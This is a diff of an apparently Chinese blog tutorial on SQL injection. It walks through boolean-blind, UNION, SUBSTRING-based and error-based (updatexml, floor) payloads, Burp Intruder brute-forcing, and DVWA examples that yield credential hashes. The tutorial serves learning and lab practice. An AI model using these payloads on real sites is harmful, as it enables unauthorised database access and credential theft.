@@ -548,31 +548,31 @@
 <h3 id="1-SQL-注入的基本原理"><a href="#1-SQL-注入的基本原理" class="headerlink" title="1. SQL 注入的基本原理"></a>1. <strong>SQL 注入的基本原理</strong></h3><p>SQL 注入攻击是通过在用户输入中插入恶意的 SQL 代码，从而干扰数据库的正常查询逻辑。盲注是一种特殊的 SQL 注入攻击，攻击者无法直接看到错误信息或查询结果，只能通过页面的响应（如页面是否加载成功、加载时间等）来判断注入是否成功。</p>
 <h3 id="2-测试语句的逻辑"><a href="#2-测试语句的逻辑" class="headerlink" title="2. 测试语句的逻辑"></a>2. <strong>测试语句的逻辑</strong></h3><h4 id="测试语句-1-1-and-1-1"><a href="#测试语句-1-1-and-1-1" class="headerlink" title="测试语句 1: 1&#39;and &#39;1&#39;=&#39;1"></a>测试语句 1: <code>1&#39;and &#39;1&#39;=&#39;1</code></h4><ul>
 <li><p><strong>逻辑解释</strong>：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
 <p>这个语句的逻辑是：</p>
 <ul>
 <li><code>1&#39;</code>：闭合原始 SQL 语句中的单引号。</li>
 <li><code>AND &#39;1&#39;=&#39;1</code>：这是一个恒真的条件，因为 <code>&#39;1&#39;=&#39;1</code> 永远成立。</li>
 </ul>
 <p>如果原始 SQL 语句是：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
 <p>注入后的语句变为：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
 <p>这个语句的逻辑没有改变，仍然会正常执行，页面应该会正常加载。</p>
 </li>
 </ul>
 <h4 id="测试语句-2-1-and-1-2"><a href="#测试语句-2-1-and-1-2" class="headerlink" title="测试语句 2: 1&#39;and &#39;1&#39;=&#39;2"></a>测试语句 2: <code>1&#39;and &#39;1&#39;=&#39;2</code></h4><ul>
 <li><p><strong>逻辑解释</strong>：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span></span><br></pre></td></tr></table></figure>
 <p>这个语句的逻辑是：</p>
 <ul>
 <li><code>1&#39;</code>：闭合原始 SQL 语句中的单引号。</li>
 <li><code>AND &#39;1&#39;=&#39;2</code>：这是一个恒假的条件，因为 <code>&#39;1&#39;=&#39;2</code> 永远不成立。</li>
 </ul>
 <p>如果原始 SQL 语句是：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
 <p>注入后的语句变为：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>
 <p>这个语句的逻辑被破坏，因为 <code>&#39;1&#39;=&#39;2</code> 永远不成立，所以整个查询不会返回任何结果，页面可能会显示错误或加载失败。</p>
 </li>
 </ul>
@@ -614,12 +614,12 @@
 </li>
 </ul>
 <h3 id="5-示例"><a href="#5-示例" class="headerlink" title="5. 示例"></a>5. <strong>示例</strong></h3><p>假设有一个用户登录页面，用户输入的用户名和密码会被用于以下 SQL 查询：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
 <p>如果攻击者输入：</p>
 <ul>
-<li>**<code>1&#39;and &#39;1&#39;=&#39;1</code>**：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
+<li>**<code>1&#39;and &#39;1&#39;=&#39;1</code>**：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
 页面正常加载。</li>
-<li>**<code>1&#39;and &#39;1&#39;=&#39;2</code>**：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>
+<li>**<code>1&#39;and &#39;1&#39;=&#39;2</code>**：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>
 页面加载失败或显示错误。</li>
 </ul>
 <p>通过这种差异，攻击者可以判断出页面存在 SQL 注入漏洞。</p>
@@ -701,7 +701,7 @@
 <p>root*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</p>
 <h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><h2 id="SUBSTRING-函数"><a href="#SUBSTRING-函数" class="headerlink" title="SUBSTRING() 函数"></a><code>SUBSTRING()</code> 函数</h2><h3 id="在-SQL-注入中的应用"><a href="#在-SQL-注入中的应用" class="headerlink" title="在 SQL 注入中的应用"></a><strong>在 SQL 注入中的应用</strong></h3><p>在 SQL 注入攻击中，攻击者经常使用 <code>SUBSTRING()</code> 函数来逐字符提取数据库中的数据，尤其是在盲注场景中。盲注是指攻击者无法直接看到查询结果，只能通过页面的响应（如加载时间、错误信息等）来判断注入是否成功。</p>
 <h4 id="提取数据库中的数据"><a href="#提取数据库中的数据" class="headerlink" title="提取数据库中的数据"></a><strong>提取数据库中的数据</strong></h4><p>假设攻击者想提取数据库中的用户名，可以使用 <code>SUBSTRING()</code> 函数逐字符提取。例如，假设 <code>users</code> 表中有 <code>username</code> 字段，攻击者可以构造如下注入语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1) = &#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1) = &#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><p>**<code>SUBSTRING(username, 1, 1)</code>**：提取 <code>username</code> 字段的第一个字符。</p>
@@ -713,17 +713,17 @@
 </ul>
 <p>如果页面响应正常，说明第一个字符是 <code>&#39;a&#39;</code>；如果页面显示错误或加载失败，说明第一个字符不是 <code>&#39;a&#39;</code>。</p>
 <p>攻击者可以通过逐字符尝试，逐步提取出完整的用户名。例如：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 2, 1) FROM users LIMIT 1) = &#x27;</span>l<span class="string">&#x27;--</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(username, <span class="number">3</span>, <span class="number">1</span>) <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;i&#x27;</span><span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 4, 1) FROM users LIMIT 1) = &#x27;</span>c<span class="string">&#x27;--</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(username, <span class="number">5</span>, <span class="number">1</span>) <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;e&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 2, 1) FROM users LIMIT 1) = &#x27;</span>l<span class="string">&#x27;--</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(username, <span class="number">3</span>, <span class="number">1</span>) <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;i&#x27;</span><span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 4, 1) FROM users LIMIT 1) = &#x27;</span>c<span class="string">&#x27;--</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(username, <span class="number">5</span>, <span class="number">1</span>) <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;e&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
 
 <p>通过这种方式，攻击者可以逐字符提取出完整的用户名。</p>
 <h3 id="3-示例"><a href="#3-示例" class="headerlink" title="3. 示例"></a>3. <strong>示例</strong></h3><p>假设有一个用户登录页面，用户输入的用户名和密码会被用于以下 SQL 查询：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;$password&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>攻击者可以构造如下注入语句：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1) = &#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1) = &#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure>
 
 <p>注入后的查询：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(username, <span class="number">1</span>, <span class="number">1</span>) <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(username, <span class="number">1</span>, <span class="number">1</span>) <span class="keyword">FROM</span> users LIMIT <span class="number">1</span>) <span class="operator">=</span> <span class="string">&#x27;a&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li><p>如果页面正常加载，说明第一个字符是 <code>&#39;a&#39;</code>。</p>
@@ -774,7 +774,7 @@
 
  sql
 </code></pre>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GROUP_CONCAT([<span class="keyword">DISTINCT</span>] expr [,expr ...]</span><br><span class="line">             [<span class="keyword">ORDER</span> <span class="keyword">BY</span> &#123;unsigned_integer <span class="operator">|</span> col_name <span class="operator">|</span> expr&#125;</span><br><span class="line">               [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>] [,col_name ...]]</span><br><span class="line">             [SEPARATOR str_val])</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">GROUP_CONCAT([<span class="keyword">DISTINCT</span>] expr [,expr ...]</span><br><span class="line">             [<span class="keyword">ORDER</span> <span class="keyword">BY</span> &#123;unsigned_integer <span class="operator">|</span> col_name <span class="operator">|</span> expr&#125;</span><br><span class="line">               [<span class="keyword">ASC</span> <span class="operator">|</span> <span class="keyword">DESC</span>] [,col_name ...]]</span><br><span class="line">             [SEPARATOR str_val])</span><br></pre></td></tr></table></figure>
 
 <pre><code>- **`expr`**：要拼接的字段或表达式。
 
@@ -785,7 +785,7 @@
 
 例如：
 </code></pre>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(<span class="keyword">user</span> SEPARATOR <span class="string">&#x27;,&#x27;</span>) <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(<span class="keyword">user</span> SEPARATOR <span class="string">&#x27;,&#x27;</span>) <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure>
 
 <pre><code>这条 SQL 会将 `users` 表中的所有 `user` 字段值拼接成一个以逗号分隔的字符串。
 </code></pre>
@@ -827,14 +827,14 @@
 <hr>
 <h4 id="4-在-SQL-注入中的用途"><a href="#4-在-SQL-注入中的用途" class="headerlink" title="4. 在 SQL 注入中的用途"></a>4. <strong>在 SQL 注入中的用途</strong></h4><pre><code>在 SQL 注入攻击中，攻击者可能会利用 `GROUP_CONCAT` 来获取多个字段的值，以便一次性提取更多有用信息。例如：
 </code></pre>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(<span class="keyword">user</span>,<span class="number">0x3a</span>,password) <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> GROUP_CONCAT(<span class="keyword">user</span>,<span class="number">0x3a</span>,password) <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure>
 
 <pre><code>这条 SQL 会将所有用户的用户名和密码拼接成一个字符串，中间用冒号分隔，方便攻击者一次性获取所有用户信息。
 </code></pre>
 <hr>
 <h4 id="5-示例-1"><a href="#5-示例-1" class="headerlink" title="5. 示例"></a>5. <strong>示例</strong></h4><pre><code>假设攻击者通过 SQL 注入攻击，构造了如下恶意 SQL：
 </code></pre>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; UNION SELECT GROUP_CONCAT(user,0x3a,password) FROM users--</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; UNION SELECT GROUP_CONCAT(user,0x3a,password) FROM users--</span></span><br></pre></td></tr></table></figure>
 
 <pre><code>这条 SQL 的作用是：
 
@@ -931,12 +931,12 @@ sleep(10)--+ 函数 sleep() 在 mysql 是延时返回的意思 以秒为单位 s
 </ol>
 <h3 id="3-构造有效载荷"><a href="#3-构造有效载荷" class="headerlink" title="3. 构造有效载荷"></a>3. <strong>构造有效载荷</strong></h3><ol>
 <li><strong>确定数据库名长度</strong>：<ul>
-<li>构造如下语句：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())&gt;10 --</span></span><br></pre></td></tr></table></figure></li>
+<li>构造如下语句：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())&gt;10 --</span></span><br></pre></td></tr></table></figure></li>
 <li>使用 Burp Suite 的 Intruder 模块，设置 Payload 类型为数字，从 1 开始递增，直到页面响应发生变化。</li>
 </ul>
 </li>
 <li><strong>逐字符爆破数据库名</strong>：<ul>
-<li>构造如下语句：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND SUBSTRING(database(), 1, 1)=&#x27;</span>k<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure></li>
+<li>构造如下语句：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND SUBSTRING(database(), 1, 1)=&#x27;</span>k<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure></li>
 <li>使用 Burp Suite 的 Intruder 模块，设置 Payload 类型为字符，从 a-z、A-Z、0-9 等字符中逐个尝试。</li>
 </ul>
 </li>
@@ -958,12 +958,12 @@ sleep(10)--+ 函数 sleep() 在 mysql 是延时返回的意思 以秒为单位 s
 <h3 id="5-示例-2"><a href="#5-示例-2" class="headerlink" title="5. 示例"></a>5. <strong>示例</strong></h3><p>假设目标 URL 是 <code>http://example.com/?id=1</code>，目标是提取数据库名：</p>
 <ol>
 <li><strong>确定数据库名长度</strong>：<ul>
-<li>构造语句：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>example.com<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())&gt;10 --</span></span><br></pre></td></tr></table></figure></li>
+<li>构造语句：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>example.com<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())&gt;10 --</span></span><br></pre></td></tr></table></figure></li>
 <li>使用 Burp Suite 的 Intruder 模块，设置 Payload 类型为数字，从 1 开始递增，直到页面响应发生变化。</li>
 </ul>
 </li>
 <li><strong>逐字符爆破数据库名</strong>：<ul>
-<li>构造语句：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>example.com<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND SUBSTRING(database(), 1, 1)=&#x27;</span>k<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure></li>
+<li>构造语句：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>example.com<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND SUBSTRING(database(), 1, 1)=&#x27;</span>k<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure></li>
 <li>使用 Burp Suite 的 Intruder 模块，设置 Payload 类型为字符，从 a-z、A-Z、0-9 等字符中逐个尝试。</li>
 </ul>
 </li>
@@ -992,89 +992,89 @@ sleep(10)--+ 函数 sleep() 在 mysql 是延时返回的意思 以秒为单位 s
 <p>得到账号和密码</p>
 <p>最后整理结果得出 admin:5f4dcc3b5aa765d61d8327deb882cf99</p>
 <h1 id="1-7报错注入"><a href="#1-7报错注入" class="headerlink" title="1.7报错注入"></a>1.7报错注入</h1><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>数据库显错是指，数据库在执行时，遇到语法不对，会显示报错信息，例如语法错语句 <code>select 1&#39;</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">11064 </span>- You have an <span class="keyword">error</span> in your SQL syntax; check the manual that corresponds <span class="keyword">to</span> your MySQL server version <span class="keyword">for</span> the right syntax <span class="keyword">to</span> use near <span class="comment">&#x27;&#x27;&#x27; at line 1</span></span><br></pre></td></tr></table></figure>
 
 <p>程序开发期间需要告诉使用者某些报错信息，方便管理员进行调试，定位文件错误。特别是 PHP 在执行 SQL 语句时一般都会采用异常处理函数，捕获错误信息。在 PHP 中使用 <code>mysql_error()</code> 函数。如果 SQL 注入存在时，会有报错信息返回，可以采用报错注入。</p>
 <h2 id="1-7-1-从代码中分析-SQL-报错注入"><a href="#1-7-1-从代码中分析-SQL-报错注入" class="headerlink" title="1.7.1 从代码中分析 SQL 报错注入"></a>1.7.1 从代码中分析 SQL 报错注入</h2><p>打开 DVWA 分析语句。如果语法错误，<code>msqli_error()</code>、<code>mysqli_connect_error()</code> 会将语法错误信息显示到页面上。</p>
 <h2 id="1-7-2-SQL-报错注入攻击"><a href="#1-7-2-SQL-报错注入攻击" class="headerlink" title="1.7.2 SQL 报错注入攻击"></a>1.7.2 SQL 报错注入攻击</h2><p>判断是否存在报错注入：输入单引号，如果报错有可能存在报错注入。如果拼接 SQL 语句带入到 MySQL 执行，即存在报错注入。</p>
 <p>输入 <code>1&#39;and info()--+</code> 显示当前库，原理是：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> info()<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> info()<span class="comment">--</span></span><br></pre></td></tr></table></figure>
 
 <p>会报错显示当前库不存在这个函数，这样当前库名就显示在页面上。</p>
 <h2 id="1-7-3-报错注入获取数据库敏感信息"><a href="#1-7-3-报错注入获取数据库敏感信息" class="headerlink" title="1.7.3 报错注入获取数据库敏感信息"></a>1.7.3 报错注入获取数据库敏感信息</h2><p>输入构造的攻击语句，页面返回数据库信息：[[常用函数]]</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--</span></span><br></pre></td></tr></table></figure>
 
 <p>把 <code>user()</code> 替换成其他的函数 <code>version()</code>、<code>database()</code> 就能得到 MySQL 的版本信息和当前库名。但是采用 <code>updatexml</code> 报错函数，只能显示 32 长度的内容，如果获取的内容超过 32 字符就要采用字符串截取方法。每次获取 32 个字符串的长度。</p>
 <p>除了 <code>updatexml</code> 函数支持报错注入外，MySQL 还有很多函数支持报错：</p>
 <ol>
 <li><p><code>floor()</code></p>
- <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="keyword">user</span>(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure>
